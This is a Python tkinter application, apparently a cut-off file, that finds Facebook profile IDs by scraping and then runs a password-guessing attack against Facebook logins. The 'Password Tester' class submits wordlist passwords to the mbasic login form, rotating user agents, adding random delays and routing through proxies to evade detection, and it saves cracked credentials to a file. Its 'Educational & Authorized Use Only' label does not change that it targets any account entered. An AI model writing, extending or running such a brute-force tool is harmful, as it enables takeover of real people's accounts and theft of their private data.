#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FACEBOOK ID FINDER & SECURITY TOOL - GUI VERSION
Version: 7.0 GUI - FIXED
Developer: CHOWDHURY VAI
GitHub: https://github.com/chowdhuryvai
"""

import os
import sys
import io
import re
import time
import json
import random
import socket
import threading
import subprocess
import importlib
import traceback
from datetime import datetime
from urllib.parse import urlparse, quote, unquote, parse_qs
from html.parser import HTMLParser

# Fix Windows encoding
if sys.platform == 'win32':
    try:
        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
        sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')
    except:
        pass
    os.environ['PYTHONIOENCODING'] = 'utf-8'

# ============================================
# AUTO INSTALL MODULES
# ============================================

def auto_install_modules():
    """Auto install required modules"""
    required = {
        'requests': 'requests',
        'mechanize': 'mechanize', 
        'bs4': 'beautifulsoup4',
    }
    
    all_ok = True
    print("\n[*] Checking modules...\n")
    
    for module, pip_name in required.items():
        try:
            if module == 'bs4':
                importlib.import_module('bs4')
            else:
                importlib.import_module(module)
            print(f"  [OK] {pip_name}")
        except ImportError:
            print(f"  [--] {pip_name} - Installing...", end=' ')
            try:
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", pip_name, "--quiet", "--no-warn-script-location"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
                print("Done!")
            except:
                try:
                    subprocess.check_call(["pip", "install", pip_name, "--quiet"],
                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    print("Done!")
                except:
                    print("Failed!")
                    all_ok = False
    
    if all_ok:
        print("\n[*] All modules ready!\n")
    time.sleep(0.5)
    return all_ok

auto_install_modules()

# Import GUI and other modules
import requests
import mechanize
from bs4 import BeautifulSoup
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog, font
import warnings
warnings.filterwarnings('ignore')
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================
# FACEBOOK ID FINDER CLASS
# ============================================

class FB_ID_Finder:
    """Facebook Profile ID Finder"""
    
    def __init__(self, log_callback=None):
        self.agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        ]
        self.log = log_callback if log_callback else print
    
    def _create_session(self):
        s = requests.Session()
        s.verify = False
        return s
    
    def _normalize_url(self, url):
        url = url.strip().replace('@', '')
        if not url.startswith('http'):
            url = 'https://' + url
        if '?' in url:
            url = url.split('?')[0]
        return url
    
    def _get_username(self, url):
        p = urlparse(url)
        path = p.path.strip('/')
        if not path:
            return None
        if 'profile.php' in path:
            qs = parse_qs(p.query)
            if 'id' in qs:
                return qs['id'][0]
            return None
        parts = path.split('/')
        username = parts[-1] if parts[-1] else None
        skip = ['photo', 'photos', 'videos', 'about', 'friends', 'posts']
        if username and username.lower() in skip:
            return None
        return username
    
    def find_id(self, profile_url):
        self.log("[*] Starting ID extraction...\n")
        
        url = self._normalize_url(profile_url)
        self.log(f"[*] Input: {profile_url}")
        self.log(f"[*] Clean: {url}\n")
        
        username = self._get_username(url)
        
        if username and username.isdigit():
            self.log(f"[+] Numeric ID found: {username}\n")
            return username
        
        if username:
            self.log(f"[*] Username: {username}\n")
        else:
            self.log("[!] Could not extract username\n")
        
        all_ids = set()
        session = self._create_session()
        headers = {'User-Agent': random.choice(self.agents)}
        
        # Method 1: mbasic.facebook.com
        self.log("[*] Method 1: mbasic.facebook.com")
        try:
            mbasic_url = f'https://mbasic.facebook.com/{username}' if username else url
            r = session.get(mbasic_url, headers=headers, timeout=15, allow_redirects=True)
            
            if r.status_code == 200:
                html = r.text
                final_url = r.url
                
                patterns = [
                    r'"userID"\s*:\s*"(\d+)"', r'"userID"\s*:\s*(\d+)',
                    r'"profile_id"\s*:\s*"(\d+)"', r'"profile_id"\s*:\s*(\d+)',
                    r'"entity_id"\s*:\s*"(\d+)"', r'"owner"\s*:\s*\{[^}]*"id"\s*:\s*"(\d+)"',
                    r'"pageID"\s*:\s*"(\d+)"', r'fb://profile/(\d+)',
                    r'profile\.php\?id=(\d+)', r'data-profileid="(\d+)"', r'data-userid="(\d+)"',
                ]
                
                for pattern in patterns:
                    for m in re.finditer(pattern, html, re.IGNORECASE):
                        val = m.group(1)
                        if val.isdigit() and 5 <= len(val) <= 20:
                            all_ids.add(val)
                
                for p in [r'profile\.php\?id=(\d+)', r'/(\d{5,})$']:
                    for m in re.finditer(p, final_url):
                        if m.group(1).isdigit():
                            all_ids.add(m.group(1))
                
                if all_ids:
                    self.log(f"  [+] Found {len(all_ids)} IDs")
                else:
                    self.log("  [-] No ID found")
            else:
                self.log(f"  [!] HTTP {r.status_code}")
        except Exception as e:
            self.log(f"  [!] Error: {str(e)[:50]}")
        
        # Method 2: Graph API
        if username and not all_ids:
            self.log("\n[*] Method 2: Graph API")
            try:
                api_url = f'https://graph.facebook.com/{username}?fields=id'
                r = session.get(api_url, headers=headers, timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    if 'id' in data:
                        all_ids.add(data['id'])
                        self.log("  [+] Graph API success")
                    else:
                        self.log("  [-] No ID in response")
                else:
                    self.log("  [-] API failed")
            except:
                self.log("  [!] Error")
        
        # Method 3: Online service
        if not all_ids:
            self.log("\n[*] Method 3: Online Service")
            try:
                api = f'https://findmyfbid.in/api/fbid?url={quote(profile_url)}'
                r = session.get(api, headers=headers, timeout=15)
                if r.status_code == 200:
                    data = r.json()
                    if 'id' in data and data['id']:
                        all_ids.add(data['id'])
                        self.log("  [+] Service success")
                    else:
                        self.log("  [-] No result")
                else:
                    self.log("  [-] Service failed")
            except:
                self.log("  [!] Error")
        
        # Method 4: Full page scan
        if not all_ids and username:
            self.log("\n[*] Method 4: Full Page Scan")
            try:
                www_url = f'https://www.facebook.com/{username}'
                r = session.get(www_url, headers=headers, timeout=15)
                
                if r.status_code == 200:
                    html = r.text
                    all_patterns = [
                        r'"userID"\s*:\s*"(\d+)"', r'"userID"\s*:\s*(\d+)',
                        r'"profile_id"\s*:\s*"(\d+)"', r'"profile_id"\s*:\s*(\d+)',
                        r'"profileID"\s*:\s*"(\d+)"', r'"id"\s*:\s*"(\d{5,})"',
                        r'"entity_id"\s*:\s*"(\d+)"', r'"owner"\s*:\s*\{[^}]*?"id"\s*:\s*"(\d+)"',
                        r'"pageID"\s*:\s*"(\d+)"', r'"actorID"\s*:\s*"(\d+)"',
                        r'fb://profile/(\d+)', r'content="fb://profile/(\d+)"',
                        r'data-profileid="(\d+)"', r'data-userid="(\d+)"', r'profile\.php\?id=(\d+)',
                    ]
                    
                    for pattern in all_patterns:
                        for m in re.finditer(pattern, html, re.IGNORECASE):
                            val = m.group(1)
                            if val.isdigit() and 5 <= len(val) <= 20:
                                skip = ['12345','123456','11111','22222','33333']
                                if val not in skip:
                                    all_ids.add(val)
                    
                    if all_ids:
                        self.log(f"  [+] Found {len(all_ids)} IDs")
                    else:
                        self.log("  [-] No ID found")
                else:
                    self.log(f"  [!] HTTP {r.status_code}")
            except Exception as e:
                self.log(f"  [!] Error: {str(e)[:50]}")
        
        # Result
        self.log("\n" + "="*50)
        
        if all_ids:
            id_list = sorted(list(all_ids), key=lambda x: (len(x), int(x)), reverse=True)
            best_id = id_list[0]
            
            self.log(f"\n[+] FACEBOOK PROFILE ID FOUND!")
            self.log(f"[+] Profile ID: {best_id}")
            
            try:
                with open('found_ids.txt', 'a') as f:
                    f.write(f"\n[{datetime.now()}] URL: {profile_url} | ID: {best_id}\n")
            except:
                pass
            
            return best_id
        else:
            self.log(f"\n[-] COULD NOT EXTRACT ID")
            self.log("[*] Try: https://findmyfbid.in/")
            return None

# ============================================
# FACEBOOK PASSWORD TESTER CLASS
# ============================================

class FB_Tester:
    """Facebook Password Tester"""
    
    def __init__(self, log_callback=None):
        self.proxy = None
        self.count = 0
        self.running = False
        self.log = log_callback if log_callback else print
        
        try:
            self.br = mechanize.Browser()
            self.br.set_handle_robots(False)
            self.br.set_handle_equiv(True)
            self.br.set_handle_redirect(True)
            self.br.set_handle_referer(True)
            self.br._factory.is_html = True
            
            self.agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            ]
            self.br.addheaders = [('User-agent', random.choice(self.agents))]
        except:
            self.log("[!] mechanize not available")
            self.br = None
    
    def check_internet(self):
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=3)
            return True
        except:
            return False
    
    def check_proxy(self, proxy):
        try:
            proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
            r = requests.get('https://api.ipify.org?format=json', proxies=proxies, timeout=10, verify=False)
            return r.status_code == 200
        except:
            return False
    
    def test_login(self, target, password):
        if not self.br:
            return -1
        try:
            self.count += 1
            time.sleep(random.uniform(0.5, 1.5))
            self.br.open("https://mbasic.facebook.com/login.php", timeout=15)
            self.br.select_form(nr=0)
            self.br.form['email'] = target
            self.br.form['pass'] = password
            resp = self.br.submit()
            data = resp.read().decode('utf-8', errors='ignore')
            if 'home_icon' in data or 'logout' in data.lower():
                return 1
            elif 'checkpoint' in self.br.geturl():
                return 2
            return 0
        except:
            try:
                self.br.addheaders = [('User-agent', random.choice(self.agents))]
            except:
                pass
            time.sleep(2)
            return -1
    
    def attack(self, target, wordlist=None, single=None, progress_callback=None):
        if not self.br:
            self.log("[!] Browser not initialized")
            return None
        
        self.running = True
        
        if single:
            passwords = [single]
        else:
            if not os.path.exists(wordlist):
                self.log(f"[!] Wordlist not found")
                return None
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [l.strip() for l in f if l.strip()]
        
        self.log(f"[*] Target: {target}")
        self.log(f"[*] Passwords: {len(passwords):,}")
        self.log(f"[*] Starting attack...\n")
        
        start_time = time.time()
        
        for i, pwd in enumerate(passwords, 1):
            if not self.running:
                self.log("\n[*] Stopped by user")
                return None
            
            pwd = pwd.strip()
            if len(pwd) < 6:
                continue
            
            if progress_callback and i % 5 == 0:
                elapsed = time.time() - start_time
                speed = i / elapsed if elapsed > 0 else 0
                eta = (len(passwords) - i) / speed if speed > 0 else 0
                progress_callback(i, len(passwords), pwd, speed, eta)
            
            result = self.test_login(target, pwd)
            
            if result == 1:
                elapsed = time.time() - start_time
                self.log(f"\n[+] PASSWORD FOUND!")
                self.log(f"[+] Password: {pwd}")
                self.log(f"[+] Time: {elapsed:.1f}s | Attempts: {i:,}")
                try:
                    with open('results.txt', 'a') as f:
                        f.write(f"\n[{datetime.now()}] {target}:{pwd} (SUCCESS)\n")
                except:
                    pass
                self.running = False
                return ('success', pwd, elapsed, i)
            
            elif result == 2:
                self.log(f"\n[!] 2FA LOCKED | Password: {pwd}")
                try:
                    with open('results.txt', 'a') as f:
                        f.write(f"\n[{datetime.now()}] {target}:{pwd} (2FA)\n")
                except:
                    pass
                self.running = False
                return ('2fa', pwd, time.time() - start_time, i)
        
        elapsed = time.time() - start_time
        self.log(f"\n[-] NOT FOUND | {elapsed:.1f}s | {i:,} tested")
        self.running = False
        return ('failed', None, elapsed, i)
    
    def stop(self):
        self.running = False

# ============================================
# GUI APPLICATION - FIXED SIZE & LAYOUT
# ============================================

class FacebookToolGUI:
    """Main GUI Application - Fixed Size & Layout"""
    
    def __init__(self, root):
        self.root = root
        self.root.title("Facebook ID Finder & Security Tool v7.0 | By CHOWDHURY VAI")
        
        # Fixed window size
        window_width = 1000
        window_height = 750
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        x = (screen_width - window_width) // 2
        y = (screen_height - window_height) // 2
        self.root.geometry(f"{window_width}x{window_height}+{x}+{y}")
        self.root.minsize(900, 650)
        
        # Color scheme
        self.colors = {
            'bg': '#0d1117',
            'fg': '#c9d1d9',
            'accent': '#161b22',
            'success': '#3fb950',
            'danger': '#f85149',
            'warning': '#d2991d',
            'info': '#58a6ff',
            'dark': '#21262d',
            'light': '#8b949e',
            'input_bg': '#0d1117',
            'input_fg': '#c9d1d9',
            'button': '#238636',
            'button_hover': '#2ea043',
            'button_red': '#da3633',
            'border': '#30363d',
        }
        
        self.root.configure(bg=self.colors['bg'])
        
        self.finder = None
        self.tester = None
        self.attack_thread = None
        self.found_id = None
        
        self.setup_styles()
        self.create_widgets()
    
    def setup_styles(self):
        """Setup ttk styles"""
        style = ttk.Style()
        style.theme_use('clam')
        
        style.configure('TFrame', background=self.colors['bg'])
        style.configure('TLabel', background=self.colors['bg'], foreground=self.colors['fg'], font=('Segoe UI', 9))
        style.configure('TButton', background=self.colors['button'], foreground='white', font=('Segoe UI', 9, 'bold'), padding=8)
        style.map('TButton', background=[('active', self.colors['button_hover'])])
        
        style.configure('Title.TLabel', font=('Segoe UI', 20, 'bold'), foreground=self.colors['success'])
        style.configure('Header.TLabel', font=('Segoe UI', 13, 'bold'), foreground=self.colors['info'])
        style.configure('TLabelframe', background=self.colors['bg'], foreground=self.colors['fg'])
        style.configure('TLabelframe.Label', background=self.colors['bg'], foreground=self.colors['info'], font=('Segoe UI', 10, 'bold'))
        
        style.configure('TNotebook', background=self.colors['bg'], borderwidth=0)
        style.configure('TNotebook.Tab', background=self.colors['dark'], foreground=self.colors['fg'], 
                       padding=[20, 8], font=('Segoe UI', 9, 'bold'))
        style.map('TNotebook.Tab', background=[('selected', self.colors['accent'])], 
                 foreground=[('selected', 'white')])
        
        style.configure('TProgressbar', background=self.colors['success'], troughcolor=self.colors['dark'])
    
    def create_widgets(self):
        """Create all GUI widgets"""
        
        # Main container with padding
        main_frame = ttk.Frame(self.root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=10)
        
        # ========== HEADER ==========
        header_frame = tk.Frame(main_frame, bg=self.colors['bg'], highlightbackground=self.colors['border'], 
                               highlightthickness=1, padx=15, pady=10)
        header_frame.pack(fill=tk.X, pady=(0, 10))
        
        tk.Label(header_frame, text="FACEBOOK ID FINDER & SECURITY TOOL", 
                font=('Segoe UI', 18, 'bold'), fg=self.colors['success'], bg=self.colors['bg']).pack()
        
        tk.Label(header_frame, text="For Educational & Authorized Use Only", 
                font=('Segoe UI', 10), fg=self.colors['warning'], bg=self.colors['bg']).pack()
        
        dev_frame = tk.Frame(header_frame, bg=self.colors['bg'])
        dev_frame.pack(pady=(5, 0))
        
        tk.Label(dev_frame, text="Developer: ", font=('Segoe UI', 9), fg=self.colors['light'], bg=self.colors['bg']).pack(side=tk.LEFT)
        tk.Label(dev_frame, text="CHOWDHURY VAI", font=('Segoe UI', 9, 'bold'), fg=self.colors['info'], bg=self.colors['bg']).pack(side=tk.LEFT)
        tk.Label(dev_frame, text="  |  ", font=('Segoe UI', 9), fg=self.colors['light'], bg=self.colors['bg']).pack(side=tk.LEFT)
        tk.Label(dev_frame, text="GitHub: ", font=('Segoe UI', 9), fg=self.colors['light'], bg=self.colors['bg']).pack(side=tk.LEFT)
        
        github_link = tk.Label(dev_frame, text="https://github.com/chowdhuryvai", 
                              font=('Segoe UI', 9, 'underline'), fg=self.colors['info'], bg=self.colors['bg'], cursor='hand2')
        github_link.pack(side=tk.LEFT)
        
        # ========== NOTEBOOK (TABS) ==========
        notebook = ttk.Notebook(main_frame)
        notebook.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        # Tab 1: ID Finder
        tab1 = ttk.Frame(notebook)
        notebook.add(tab1, text="  🔍 ID Finder  ")
        self.create_id_finder_tab(tab1)
        
        # Tab 2: Password Tester
        tab2 = ttk.Frame(notebook)
        notebook.add(tab2, text="  🔑 Password Tester  ")
        self.create_password_tester_tab(tab2)
        
        # Tab 3: Proxy
        tab3 = ttk.Frame(notebook)
        notebook.add(tab3, text="  🌐 Proxy  ")
        self.create_proxy_tab(tab3)
        
        # ========== CONSOLE OUTPUT ==========
        console_frame = ttk.LabelFrame(main_frame, text=" 📟 Console Output ", padding=5)
        console_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 5))
        
        # Console with fixed height
        self.console = scrolledtext.ScrolledText(
            console_frame,
            height=10,
            bg=self.colors['dark'],
            fg='#00ff00',
            insertbackground='#00ff00',
            font=('Consolas', 9),
            wrap=tk.WORD,
            relief=tk.FLAT,
            borderwidth=3
        )
        self.console.pack(fill=tk.BOTH, expand=True)
        
        # Configure console tags
        self.console.tag_config('success', foreground='#3fb950')
        self.console.tag_config('error', foreground='#f85149')
        self.console.tag_config('warning', foreground='#d2991d')
        self.console.tag_config('info', foreground='#58a6ff')
        self.console.tag_config('header', foreground='#bc8cff', font=('Consolas', 9, 'bold'))
        
        # ========== BOTTOM BUTTONS ==========
        button_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        button_frame.pack(fill=tk.X, pady=(5, 0))
        
        tk.Button(button_frame, text="🗑️ Clear Console", bg=self.colors['dark'], fg=self.colors['fg'],
                 font=('Segoe UI', 9), relief=tk.FLAT, padx=15, pady=5, cursor='hand2',
                 command=self.clear_console).pack(side=tk.LEFT, padx=(0, 5))
        
        tk.Button(button_frame, text="❌ Exit", bg=self.colors['button_red'], fg='white',
                 font=('Segoe UI', 9, 'bold'), relief=tk.FLAT, padx=20, pady=5, cursor='hand2',
                 command=self.root.quit).pack(side=tk.RIGHT)
        
        # ========== STATUS BAR ==========
        status_frame = tk.Frame(main_frame, bg=self.colors['dark'], height=25)
        status_frame.pack(fill=tk.X, pady=(5, 0))
        status_frame.pack_propagate(False)
        
        self.status_var = tk.StringVar(value="✅ Ready")
        tk.Label(status_frame, textvariable=self.status_var, bg=self.colors['dark'], 
                fg=self.colors['fg'], font=('Segoe UI', 9), anchor=tk.W).pack(fill=tk.X, padx=10)
    
    def create_id_finder_tab(self, parent):
        """ID Finder Tab"""
        frame = ttk.Frame(parent, padding=15)
        frame.pack(fill=tk.BOTH, expand=True)
        
        # URL Input
        url_frame = ttk.LabelFrame(frame, text=" Enter Profile URL ", padding=10)
        url_frame.pack(fill=tk.X, pady=(0, 10))
        
        tk.Label(url_frame, text="Facebook Profile URL:", font=('Segoe UI', 10, 'bold'), 
                fg=self.colors['fg'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 5))
        
        entry_frame = tk.Frame(url_frame, bg=self.colors['bg'])
        entry_frame.pack(fill=tk.X)
        
        self.url_entry = tk.Entry(entry_frame, bg=self.colors['input_bg'], fg=self.colors['input_fg'],
                                  insertbackground='white', font=('Segoe UI', 11), relief=tk.FLAT, bd=3,
                                  highlightbackground=self.colors['border'], highlightthickness=1)
        self.url_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=3)
        self.url_entry.insert(0, "https://facebook.com/")
        
        tk.Button(entry_frame, text="🔍 FIND ID", bg=self.colors['button'], fg='white',
                 font=('Segoe UI', 10, 'bold'), relief=tk.FLAT, padx=20, pady=5, cursor='hand2',
                 command=self.find_id_action).pack(side=tk.LEFT, padx=(10, 0))
        
        # Result Display
        result_frame = ttk.LabelFrame(frame, text=" Result ", padding=10)
        result_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.id_result_var = tk.StringVar(value="Waiting for input...")
        tk.Label(result_frame, textvariable=self.id_result_var, font=('Segoe UI', 12, 'bold'),
                fg=self.colors['success'], bg=self.colors['bg']).pack(anchor=tk.CENTER)
        
        self.copy_btn = tk.Button(result_frame, text="📋 Copy ID", bg=self.colors['info'], fg='white',
                                  font=('Segoe UI', 9), relief=tk.FLAT, padx=15, pady=3, cursor='hand2',
                                  command=self.copy_id, state=tk.DISABLED)
        
        # Example URLs
        example_frame = ttk.LabelFrame(frame, text=" Example URLs ", padding=10)
        example_frame.pack(fill=tk.X)
        
        examples = [
            "https://facebook.com/username",
            "https://www.facebook.com/profile.php?id=123456789",
            "https://fb.com/username",
        ]
        
        for ex in examples:
            tk.Label(example_frame, text=f"• {ex}", font=('Consolas', 9), 
                    fg=self.colors['light'], bg=self.colors['bg']).pack(anchor=tk.W)
    
    def create_password_tester_tab(self, parent):
        """Password Tester Tab"""
        frame = ttk.Frame(parent, padding=15)
        frame.pack(fill=tk.BOTH, expand=True)
        
        # Target Input
        target_frame = ttk.LabelFrame(frame, text=" Target ", padding=10)
        target_frame.pack(fill=tk.X, pady=(0, 10))
        
        tk.Label(target_frame, text="Target (Email/Phone/ID):", font=('Segoe UI', 10, 'bold'),
                fg=self.colors['fg'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 5))
        
        self.target_entry = tk.Entry(target_frame, bg=self.colors['input_bg'], fg=self.colors['input_fg'],
                                     insertbackground='white', font=('Segoe UI', 11), relief=tk.FLAT, bd=3,
                                     highlightbackground=self.colors['border'], highlightthickness=1)
        self.target_entry.pack(fill=tk.X, ipady=3)
        
        # Method Selection
        method_frame = ttk.LabelFrame(frame, text=" Attack Method ", padding=10)
        method_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.method_var = tk.StringVar(value="single")
        
        radio_frame = tk.Frame(method_frame, bg=self.colors['bg'])
        radio_frame.pack(anchor=tk.W)
        
        tk.Radiobutton(radio_frame, text="Single Password", variable=self.method_var, value="single",
                      font=('Segoe UI', 10), fg=self.colors['fg'], bg=self.colors['bg'],
                      selectcolor=self.colors['dark'], activebackground=self.colors['bg'],
                      activeforeground=self.colors['fg'], command=self.toggle_method).pack(side=tk.LEFT, padx=(0, 30))
        
        tk.Radiobutton(radio_frame, text="Wordlist Attack", variable=self.method_var, value="wordlist",
                      font=('Segoe UI', 10), fg=self.colors['fg'], bg=self.colors['bg'],
                      selectcolor=self.colors['dark'], activebackground=self.colors['bg'],
                      activeforeground=self.colors['fg'], command=self.toggle_method).pack(side=tk.LEFT)
        
        # Single Password
        self.single_frame = tk.Frame(method_frame, bg=self.colors['bg'])
        self.single_frame.pack(fill=tk.X, pady=(10, 0))
        
        tk.Label(self.single_frame, text="Password:", font=('Segoe UI', 10),
                fg=self.colors['fg'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 5))
        
        self.password_entry = tk.Entry(self.single_frame, bg=self.colors['input_bg'], fg=self.colors['input_fg'],
                                       insertbackground='white', font=('Segoe UI', 11), relief=tk.FLAT, bd=3,
                                       highlightbackground=self.colors['border'], highlightthickness=1, show='•')
        self.password_entry.pack(fill=tk.X, ipady=3)
        
        # Wordlist
        self.wordlist_frame = tk.Frame(method_frame, bg=self.colors['bg'])
        
        tk.Label(self.wordlist_frame, text="Wordlist File:", font=('Segoe UI', 10),
                fg=self.colors['fg'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 5))
        
        wl_entry_frame = tk.Frame(self.wordlist_frame, bg=self.colors['bg'])
        wl_entry_frame.pack(fill=tk.X)
        
        self.wordlist_path = tk.StringVar()
        tk.Entry(wl_entry_frame, textvariable=self.wordlist_path, bg=self.colors['input_bg'], fg=self.colors['input_fg'],
                font=('Segoe UI', 11), relief=tk.FLAT, bd=3, highlightbackground=self.colors['border'],
                highlightthickness=1).pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=3)
        
        tk.Button(wl_entry_frame, text="📁 Browse", bg=self.colors['info'], fg='white',
                 font=('Segoe UI', 9), relief=tk.FLAT, padx=15, pady=3, cursor='hand2',
                 command=self.browse_wordlist).pack(side=tk.LEFT, padx=(10, 0))
        
        # Attack Button
        btn_frame = tk.Frame(frame, bg=self.colors['bg'])
        btn_frame.pack(fill=tk.X, pady=(0, 5))
        
        self.attack_btn = tk.Button(btn_frame, text="🚀 START ATTACK", bg=self.colors['button_red'], fg='white',
                                    font=('Segoe UI', 11, 'bold'), relief=tk.FLAT, padx=30, pady=8,
                                    cursor='hand2', command=self.start_attack)
        self.attack_btn.pack(side=tk.LEFT)
        
        self.stop_btn = tk.Button(btn_frame, text="⏹️ STOP", bg='#636e72', fg='white',
                                  font=('Segoe UI', 11, 'bold'), relief=tk.FLAT, padx=30, pady=8,
                                  cursor='hand2', command=self.stop_attack, state=tk.DISABLED)
        
        # Progress
        progress_frame = ttk.LabelFrame(frame, text=" Progress ", padding=10)
        progress_frame.pack(fill=tk.X)
        
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(progress_frame, variable=self.progress_var, maximum=100)
        self.progress_bar.pack(fill=tk.X, pady=(0, 5))
        
        self.progress_label_var = tk.StringVar(value="Ready to attack...")
        tk.Label(progress_frame, textvariable=self.progress_label_var, font=('Consolas', 9),
                fg=self.colors['light'], bg=self.colors['bg']).pack(anchor=tk.CENTER)
    
    def create_proxy_tab(self, parent):
        """Proxy Tab"""
        frame = ttk.Frame(parent, padding=15)
        frame.pack(fill=tk.BOTH, expand=True)
        
        # Proxy Input
        proxy_frame = ttk.LabelFrame(frame, text=" Proxy Configuration ", padding=10)
        proxy_frame.pack(fill=tk.X, pady=(0, 10))
        
        tk.Label(proxy_frame, text="Proxy Server (IP:PORT):", font=('Segoe UI', 10, 'bold'),
                fg=self.colors['fg'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 5))
        
        entry_frame = tk.Frame(proxy_frame, bg=self.colors['bg'])
        entry_frame.pack(fill=tk.X)
        
        self.proxy_entry = tk.Entry(entry_frame, bg=self.colors['input_bg'], fg=self.colors['input_fg'],
                                    insertbackground='white', font=('Segoe UI', 11), relief=tk.FLAT, bd=3,
                                    highlightbackground=self.colors['border'], highlightthickness=1)
        self.proxy_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=3)
        
        tk.Button(entry_frame, text="🔍 Test", bg=self.colors['info'], fg='white',
                 font=('Segoe UI', 9), relief=tk.FLAT, padx=15, pady=3, cursor='hand2',
                 command=self.test_proxy).pack(side=tk.LEFT, padx=(10, 5))
        
        tk.Button(entry_frame, text="💾 Save", bg=self.colors['button'], fg='white',
                 font=('Segoe UI', 9, 'bold'), relief=tk.FLAT, padx=15, pady=3, cursor='hand2',
                 command=self.save_proxy).pack(side=tk.LEFT)
        
        # Status
        self.proxy_status_var = tk.StringVar(value="No proxy configured")
        tk.Label(proxy_frame, textvariable=self.proxy_status_var, font=('Segoe UI', 10),
                fg=self.colors['warning'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(10, 0))
    
    def log_to_console(self, text, tag=None):
        """Add text to console"""
        self.console.insert(tk.END, text + '\n', tag)
        self.console.see(tk.END)
        self.root.update_idletasks()
    
    def clear_console(self):
        """Clear console"""
        self.console.delete(1.0, tk.END)
        self.status_var.set("✅ Console cleared")
    
    def toggle_method(self):
        """Toggle password method"""
        if self.method_var.get() == 'single':
            self.single_frame.pack(fill=tk.X, pady=(10, 0))
            self.wordlist_frame.pack_forget()
        else:
            self.single_frame.pack_forget()
            self.wordlist_frame.pack(fill=tk.X, pady=(10, 0))
    
    def browse_wordlist(self):
        """Browse wordlist"""
        filename = filedialog.askopenfilename(title="Select Wordlist File")
        if filename:
            self.wordlist_path.set(filename)
    
    def find_id_action(self):
        """Find ID button action"""
        url = self.url_entry.get().strip()
        if not url:
            messagebox.showwarning("Warning", "Please enter a URL!")
            return
        
        self.clear_console()
        self.status_var.set("🔍 Searching for ID...")
        self.id_result_var.set("Searching...")
        self.copy_btn.pack_forget()
        
        self.finder = FB_ID_Finder(log_callback=self.log_to_console)
        
        def run():
            result = self.finder.find_id(url)
            self.root.after(0, lambda: self.display_id_result(result))
        
        threading.Thread(target=run, daemon=True).start()
    
    def display_id_result(self, result):
        """Display ID result"""
        if result:
            self.found_id = result
            self.id_result_var.set(f"✅ Profile ID: {result}")
            self.copy_btn.config(state=tk.NORMAL)
            self.copy_btn.pack(pady=(10, 0))
            self.status_var.set(f"✅ ID Found: {result}")
        else:
            self.found_id = None
            self.id_result_var.set("❌ Could not extract ID")
            self.copy_btn.pack_forget()
            self.status_var.set("❌ ID not found")
    
    def copy_id(self):
        """Copy ID to clipboard"""
        if self.found_id:
            self.root.clipboard_clear()
            self.root.clipboard_append(self.found_id)
            self.status_var.set(f"📋 Copied: {self.found_id}")
    
    def test_proxy(self):
        """Test proxy"""
        proxy = self.proxy_entry.get().strip()
        if not proxy:
            messagebox.showwarning("Warning", "Enter proxy!")
            return
        if ':' not in proxy:
            proxy += ':8080'
        
        self.proxy_status_var.set("Testing...")
        
        def run():
            tester = FB_Tester()
            if tester.check_proxy(proxy):
                self.root.after(0, lambda: self.proxy_status_var.set(f"✅ Proxy OK: {proxy}"))
            else:
                self.root.after(0, lambda: self.proxy_status_var.set("❌ Proxy FAILED!"))
        
        threading.Thread(target=run, daemon=True).start()
    
    def save_proxy(self):
        """Save proxy"""
        proxy = self.proxy_entry.get().strip()
        if proxy:
            if ':' not in proxy:
                proxy += ':8080'
            if self.tester:
                self.tester.proxy = proxy
                self.tester.br.set_proxies({'http': f'http://{proxy}', 'https': f'http://{proxy}'})
            self.proxy_status_var.set(f"✅ Saved: {proxy}")
    
    def start_attack(self):
        """Start attack"""
        target = self.target_entry.get().strip()
        if not target:
            messagebox.showwarning("Warning", "Enter target!")
            return
        
        self.clear_console()
        self.status_var.set("🚀 Starting attack...")
        
        self.tester = FB_Tester(log_callback=self.log_to_console)
        
        if not self.tester.check_internet():
            messagebox.showerror("Error", "No internet!")
            return
        
        proxy = self.proxy_entry.get().strip()
        if proxy:
            if ':' not in proxy:
                proxy += ':8080'
            self.tester.proxy = proxy
            self.tester.br.set_proxies({'http': f'http://{proxy}', 'https': f'http://{proxy}'})
        
        if self.method_var.get() == 'single':
            password = self.password_entry.get().strip()
            if not password or len(password) < 6:
                messagebox.showwarning("Warning", "Password must be 6+ characters!")
                return
            self._run_attack(target, single=password)
        else:
            wordlist = self.wordlist_path.get()
